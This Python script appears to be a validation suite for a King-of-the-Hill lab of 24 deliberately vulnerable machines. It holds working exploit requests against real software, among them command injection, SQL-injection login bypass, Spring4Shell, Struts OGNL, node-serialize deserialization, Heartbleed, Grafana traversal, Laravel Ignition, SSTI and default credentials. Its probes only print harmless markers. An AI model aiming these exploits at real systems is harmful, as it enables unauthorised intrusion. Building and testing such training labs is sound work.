#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import tempfile
import time
import urllib.parse

from common import (
    CheckResult,
    SNMP_SYS_DESCR_GET,
    command_exists,
    http_request,
    make_cookie_opener,
    multipart_form_data,
    print_table,
    run_command,
    tcp_roundtrip,
    udp_roundtrip,
    url_for,
    write_json,
)
from targets import TARGETS, selected_targets


def ok(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "PASS", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def warn(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "WARN", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def fail(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "FAIL", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def extract_text(blob: bytes) -> str:
    return blob.decode("utf-8", errors="ignore")


def check_h1a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    body, content_type = multipart_form_data(
        {"action": "UploadHandler"},
        [("file", "qa_probe.txt", b"h1a_upload_ok\n", "text/plain")],
    )
    status, response, _ = http_request(
        url_for(host, TARGETS["machineH1A"].port, "http", "/wp-content/plugins/reflex-gallery/reflex-gallery.php"),
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
    )
    text = extract_text(response)
    if status == 200 and "/wp-content/uploads/qa_probe.txt" in text:
        fetch_status, fetch_body, _ = http_request(
            url_for(host, TARGETS["machineH1A"].port, "http", "/wp-content/uploads/qa_probe.txt"),
            timeout=timeout,
        )
        if fetch_status == 200 and "h1a_upload_ok" in extract_text(fetch_body):
            return ok("machineH1A", "unauth-upload", "Reflex Gallery upload handler accepted and served a probe file.", started, extract_text(fetch_body).strip())
    return fail("machineH1A", "unauth-upload", f"Upload handler did not return the expected file path. status={status}", started, text[:200])


def check_h1b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    latency_ms, body = tcp_roundtrip(host, TARGETS["machineH1B"].port, send=b"*1\r\n$4\r\nPING\r\n", timeout=timeout)
    text = extract_text(body)
    if "PONG" in text:
        return CheckResult("machineH1B", "PASS", "unauth-service", "Redis accepted an unauthenticated PING.", latency_ms, text.strip())
    return fail("machineH1B", "unauth-service", "Redis did not return PONG.", started, text[:200])


def check_h1c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    path = "/?ip=" + urllib.parse.quote("127.0.0.1;printf h1c_ok")
    status, body, _ = http_request(url_for(host, TARGETS["machineH1C"].port, "http", path), timeout=timeout)
    text = extract_text(body)
    if status == 200 and "h1c_ok" in text:
        return ok("machineH1C", "rce", "Ping diagnostics endpoint executed the injected command.", started, "h1c_ok")
    return fail("machineH1C", "rce", f"Injection marker not found. status={status}", started, text[:200])


def check_h2a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    data = urllib.parse.urlencode({"script": "println('h2a_ok')"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH2A"].port, "http", "/scriptText"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h2a_ok" in text:
        return ok("machineH2A", "rce", "Jenkins script console executed a Groovy probe without auth.", started, text.strip())
    return fail("machineH2A", "rce", f"Script console probe failed. status={status}", started, text[:200])


def check_h2b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"username": "' OR '1'='1", "password": "' OR '1'='1"}).encode()
    http_request(
        url_for(host, TARGETS["machineH2B"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    exploit = urllib.parse.urlencode({"dir": ".; printf h2b_ok"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH2B"].port, "http", "/admin.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=exploit,
        timeout=timeout,
        opener=opener,
    )
    text = extract_text(body)
    if status == 200 and "h2b_ok" in text:
        return ok("machineH2B", "rce", "SQLi login bypass reached the admin command injection sink.", started, "h2b_ok")
    return fail("machineH2B", "rce", f"Admin panel did not return the injection marker. status={status}", started, text[:200])


def check_h2c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    auth = base64.b64encode(b"tomcat:tomcat").decode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH2C"].port, "http", "/manager/text/list"),
        headers={"Authorization": f"Basic {auth}"},
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "OK - Listed applications" in text:
        return ok("machineH2C", "default-creds", "Tomcat manager accepted the default tomcat:tomcat credential.", started, text.splitlines()[0])
    return fail("machineH2C", "default-creds", f"Tomcat manager did not accept default creds. status={status}", started, text[:200])


def check_h3a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    if command_exists("smbclient"):
        proc = run_command(["smbclient", "-N", f"//{host}/", "-p", str(TARGETS["machineH3A"].port), "-L"], timeout=timeout + 10)
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and ("Disk" in merged or "public" in merged.lower()):
            return ok("machineH3A", "anon-share", "smbclient listed shares anonymously.", started, merged[:200].strip())
        return fail("machineH3A", "anon-share", f"smbclient failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, _ = tcp_roundtrip(host, TARGETS["machineH3A"].port, timeout=timeout, recv_bytes=0)
        return CheckResult("machineH3A", "WARN", "fingerprint", "Port 445 is reachable, but anonymous share validation needs smbclient.", latency_ms, "install smbclient for full coverage")
    except OSError as exc:
        return fail("machineH3A", "anon-share", f"SMB port not reachable: {exc}", started)


def check_h3b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    status, body, _ = http_request(url_for(host, TARGETS["machineH3B"].port, "http", "/CHANGELOG.txt"), timeout=timeout)
    text = extract_text(body)
    if status == 200 and "Drupal 7" in text:
        return warn("machineH3B", "fingerprint", "Drupal 7 fingerprint confirmed. Drupalgeddon2 execution remains a manual follow-up.", started, text.splitlines()[0])
    return fail("machineH3B", "fingerprint", f"Drupal fingerprint not found. status={status}", started, text[:200])


def check_h3c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    status, body, _ = http_request(url_for(host, TARGETS["machineH3C"].port, "http", "/.git/HEAD"), timeout=timeout)
    text = extract_text(body)
    if status == 200 and "refs/heads/" in text:
        return ok("machineH3C", "file-read", "The exposed .git directory leaked repository metadata.", started, text.strip())
    return fail("machineH3C", "file-read", f".git/HEAD was not exposed. status={status}", started, text[:200])


def check_h4a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    profile = json.dumps(
        {
            "probe": "_$$ND_FUNC$$_function(){return require('child_process').execSync('printf h4a_ok').toString()}()"
        }
    )
    payload = json.dumps({"profile": profile}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH4A"].port, "http", "/profile"),
        method="POST",
        headers={"Content-Type": "application/json"},
        data=payload,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h4a_ok" in text:
        return ok("machineH4A", "rce", "node-serialize deserialization executed the probe command.", started, "h4a_ok")
    return fail("machineH4A", "rce", f"node-serialize probe failed. status={status}", started, text[:200])


def check_h4b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    data = urllib.parse.urlencode({"class.module.classLoader": "1", "cmd": "printf h4b_ok"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH4B"].port, "http", "/greeting"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h4b_ok" in text:
        return ok("machineH4B", "rce", "Spring4Shell stub executed the provided command as springuser.", started, "h4b_ok")
    return fail("machineH4B", "rce", f"Spring4Shell probe failed. status={status}", started, text[:200])


def check_h4c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    internal = "http://127.0.0.1:1337/api/exec?cmd=printf%20h4c_ok"
    path = "/?url=" + urllib.parse.quote(internal, safe="")
    status, body, _ = http_request(url_for(host, TARGETS["machineH4C"].port, "http", path), timeout=timeout)
    text = extract_text(body)
    if status == 200 and "h4c_ok" in text:
        return ok("machineH4C", "ssrf-rce", "The SSRF fetcher reached the internal root exec API.", started, "h4c_ok")
    return fail("machineH4C", "ssrf-rce", f"SSRF probe did not surface the command output. status={status}", started, text[:200])


def check_h5a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    data = urllib.parse.urlencode({"user": "root", "old": "x|printf h5a_ok", "new1": "a", "new2": "a"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH5A"].port, "http", "/password_change.cgi"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h5a_ok" in text:
        return ok("machineH5A", "rce", "Webmin password change probe executed a command pre-auth.", started, "h5a_ok")
    return fail("machineH5A", "rce", f"Webmin probe failed. status={status}", started, text[:200])


def check_h5b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    payload = json.dumps({"script": "Runtime.getRuntime().exec('printf h5b_ok')"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH5B"].port, "http", "/_search"),
        method="POST",
        headers={"Content-Type": "application/json"},
        data=payload,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h5b_ok" in text:
        return ok("machineH5B", "rce", "Elasticsearch dynamic scripting executed a probe command.", started, "h5b_ok")
    return fail("machineH5B", "rce", f"Dynamic scripting probe failed. status={status}", started, text[:200])


def check_h5c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH5C"].port, "http", "/login.action"),
        method="POST",
        headers={"Content-Type": "%{exec(\"printf h5c_ok\")}"},
        data=b"",
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h5c_ok" in text:
        return ok("machineH5C", "rce", "Struts content-type OGNL probe executed the command.", started, "h5c_ok")
    return fail("machineH5C", "rce", f"Struts probe failed. status={status}", started, text[:200])


def check_h6a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    try:
        distcc_ms, _ = tcp_roundtrip(host, TARGETS["machineH6A"].port, timeout=timeout, recv_bytes=0)
        nfs_ms, _ = tcp_roundtrip(host, 10051, timeout=timeout, recv_bytes=0)
        detail = f"distcc_ms={distcc_ms:.2f}, nfs_ms={nfs_ms:.2f}"
        return warn("machineH6A", "fingerprint", "distccd and NFS ports are reachable. Full exploitation needs protocol-specific tooling.", started, detail)
    except OSError as exc:
        return fail("machineH6A", "fingerprint", f"One of the H6A ports was unreachable: {exc}", started)


def check_h6b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    if command_exists("mongosh"):
        proc = run_command(
            [
                "mongosh",
                f"mongodb://{host}:{TARGETS['machineH6B'].port}/kothdb",
                "--quiet",
                "--eval",
                "JSON.stringify(db.users.findOne({username:'mongouser'}))",
            ],
            timeout=timeout + 10,
        )
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and "mongouser" in merged:
            return ok("machineH6B", "db-read", "MongoDB returned seeded user data without authentication.", started, merged.strip()[:200])
        return fail("machineH6B", "db-read", f"mongosh query failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, _ = tcp_roundtrip(host, TARGETS["machineH6B"].port, timeout=timeout, recv_bytes=0)
        return CheckResult("machineH6B", "WARN", "fingerprint", "MongoDB port is reachable, but seeded-data validation needs mongosh.", latency_ms, "install mongosh for full coverage")
    except OSError as exc:
        return fail("machineH6B", "db-read", f"MongoDB port not reachable: {exc}", started)


def check_h6c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    heartbeat = b"\x18\x03\x02\x00\x03\x01\x00\x80"
    _, body = tcp_roundtrip(host, TARGETS["machineH6C"].port, send=heartbeat, timeout=timeout)
    if b"ssh_password=web123" in body and b"username=webuser" in body:
        return ok("machineH6C", "memory-leak", "Heartbleed probe leaked the embedded session data.", started, extract_text(body)[:200])
    return fail("machineH6C", "memory-leak", "Heartbeat response did not leak the expected session data.", started, extract_text(body)[:200])


def check_h7a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    if command_exists("snmpwalk"):
        proc = run_command(
            ["snmpwalk", "-v1", "-c", "public", f"{host}:{TARGETS['machineH7A'].port}", "1.3.6.1.2.1.25.4.2.1.5"],
            timeout=timeout + 10,
        )
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and ("opsuser" in merged or "snmpops" in merged):
            return ok("machineH7A", "cred-leak", "SNMP exposed the process list containing the leaked SSH credential.", started, merged[:200].strip())
        return fail("machineH7A", "cred-leak", f"snmpwalk failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, body = udp_roundtrip(host, TARGETS["machineH7A"].port, SNMP_SYS_DESCR_GET, timeout=timeout)
        if body:
            return CheckResult("machineH7A", "WARN", "fingerprint", "SNMP public community responded, but process-list credential validation needs snmpwalk.", latency_ms, f"bytes={len(body)}")
        return fail("machineH7A", "fingerprint", "SNMP did not return a response.", started)
    except OSError as exc:
        return fail("machineH7A", "fingerprint", f"SNMP probe failed: {exc}", started)


def check_h7b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    traversal = "/public/plugins/text/../../../../../../../etc/grafana/grafana.ini"
    status, body, _ = http_request(url_for(host, TARGETS["machineH7B"].port, "http", traversal), timeout=timeout)
    text = extract_text(body)
    if status != 200:
        return fail("machineH7B", "traversal-rce", f"Grafana traversal did not return grafana.ini. status={status}", started, text[:200])

    user_match = re.search(r"admin_user\s*=\s*(\S+)", text)
    pass_match = re.search(r"admin_password\s*=\s*(\S+)", text)
    username = user_match.group(1) if user_match else "admin"
    password = pass_match.group(1) if pass_match else "admin"

    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"user": username, "password": password}).encode()
    http_request(
        url_for(host, TARGETS["machineH7B"].port, "http", "/login"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    exec_status, exec_body, _ = http_request(
        url_for(host, TARGETS["machineH7B"].port, "http", "/api/admin/exec?cmd=printf%20h7b_ok"),
        timeout=timeout,
        opener=opener,
    )
    exec_text = extract_text(exec_body)
    if exec_status == 200 and "h7b_ok" in exec_text:
        return ok("machineH7B", "traversal-rce", "Path traversal exposed Grafana creds and the admin exec endpoint ran a probe command.", started, "h7b_ok")
    return fail("machineH7B", "traversal-rce", f"Traversal worked but admin exec did not return the probe marker. status={exec_status}", started, exec_text[:200])


def check_h7c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    if command_exists("rsync"):
        with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8") as handle:
            handle.write("h7c_rsync_ok\n")
            local_path = handle.name
        try:
            proc = run_command(["rsync", local_path, f"rsync://{host}:{TARGETS['machineH7C'].port}/public/qa_probe.txt"], timeout=timeout + 10)
            merged = (proc.stdout or "") + (proc.stderr or "")
            if proc.returncode == 0:
                return ok("machineH7C", "anon-write", "Anonymous rsync upload to the public module succeeded.", started, "qa_probe.txt uploaded")
            return fail("machineH7C", "anon-write", f"rsync upload failed with rc={proc.returncode}", started, merged[:200])
        finally:
            try:
                os.unlink(local_path)
            except OSError:
                pass

    try:
        latency_ms, body = tcp_roundtrip(host, TARGETS["machineH7C"].port, timeout=timeout)
        text = extract_text(body)
        if "@RSYNCD:" in text:
            return CheckResult("machineH7C", "WARN", "fingerprint", "rsync daemon is reachable, but anonymous write validation needs the rsync client binary.", latency_ms, text.strip())
        return fail("machineH7C", "fingerprint", "rsync banner missing.", started, text[:200])
    except OSError as exc:
        return fail("machineH7C", "anon-write", f"rsync port not reachable: {exc}", started)


def check_h8a(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"pma_username": "root", "pma_password": ""}).encode()
    http_request(
        url_for(host, TARGETS["machineH8A"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    sql = urllib.parse.urlencode({"sql": "SELECT 1337 AS qa_probe;"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH8A"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=sql,
        timeout=timeout,
        opener=opener,
    )
    text = extract_text(body)
    if status == 200 and "qa_probe" in text and "1337" in text:
        return ok("machineH8A", "auth-bypass", "phpMyAdmin accepted root with a blank password and executed SQL.", started, "qa_probe=1337")
    return fail("machineH8A", "auth-bypass", f"phpMyAdmin probe failed. status={status}", started, text[:200])


def check_h8b(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    path = "/?name=" + urllib.parse.quote("{{7*7}}")
    status, body, _ = http_request(url_for(host, TARGETS["machineH8B"].port, "http", path), timeout=timeout)
    text = extract_text(body)
    if status == 200 and "Hello, 49!" in text:
        return ok("machineH8B", "ssti", "Jinja2 rendered attacker-controlled template syntax.", started, "Hello, 49!")
    return fail("machineH8B", "ssti", f"SSTI marker was not rendered. status={status}", started, text[:200])


def check_h8c(host: str, timeout: float) -> CheckResult:
    started = time.perf_counter()
    payload = json.dumps(
        {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {"variableName": "username", "viewFile": "phar://qa-probe", "cmd": "printf h8c_ok"},
        }
    ).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH8C"].port, "http", "/_ignition/execute-solution"),
        method="POST",
        headers={"Content-Type": "application/json"},
        data=payload,
        timeout=timeout,
    )
    text = extract_text(body)
    if status == 200 and "h8c_ok" in text:
        return ok("machineH8C", "rce", "Laravel Ignition execute-solution endpoint returned the command output.", started, "h8c_ok")
    return fail("machineH8C", "rce", f"Ignition probe failed. status={status}", started, text[:200])


CHECKS = {
    "machineH1A": check_h1a,
    "machineH1B": check_h1b,
    "machineH1C": check_h1c,
    "machineH2A": check_h2a,
    "machineH2B": check_h2b,
    "machineH2C": check_h2c,
    "machineH3A": check_h3a,
    "machineH3B": check_h3b,
    "machineH3C": check_h3c,
    "machineH4A": check_h4a,
    "machineH4B": check_h4b,
    "machineH4C": check_h4c,
    "machineH5A": check_h5a,
    "machineH5B": check_h5b,
    "machineH5C": check_h5c,
    "machineH6A": check_h6a,
    "machineH6B": check_h6b,
    "machineH6C": check_h6c,
    "machineH7A": check_h7a,
    "machineH7B": check_h7b,
    "machineH7C": check_h7c,
    "machineH8A": check_h8a,
    "machineH8B": check_h8b,
    "machineH8C": check_h8c,
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Vulnerability exposure suite for the KoTH stack.")
    parser.add_argument("--host", default="127.0.0.1", help="Target host running the competition stack.")
    parser.add_argument("--targets", help="Comma-separated target list. Defaults to all machines.")
    parser.add_argument("--timeout", type=float, default=5.0, help="Per-check timeout in seconds.")
    parser.add_argument("--json-out", help="Write structured results to this JSON file.")
    parser.add_argument("--fail-on-warn", action="store_true", help="Exit non-zero if any check returns WARN.")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    targets = selected_targets(args.targets)
    results = [CHECKS[target.name](args.host, args.timeout) for target in targets]

    rows = [
        [result.name, result.status, result.proof, f"{result.latency_ms:.2f}" if result.latency_ms is not None else "", result.detail]
        for result in results
    ]
    print_table(["Target", "Status", "Proof", "Latency ms", "Detail"], rows)

    if args.json_out:
        write_json(
            args.json_out,
            {
                "host": args.host,
                "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "results": results,
            },
        )

    failed = any(result.status == "FAIL" for result in results)
    warned = any(result.status == "WARN" for result in results)
    if failed or (warned and args.fail_on_warn):
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
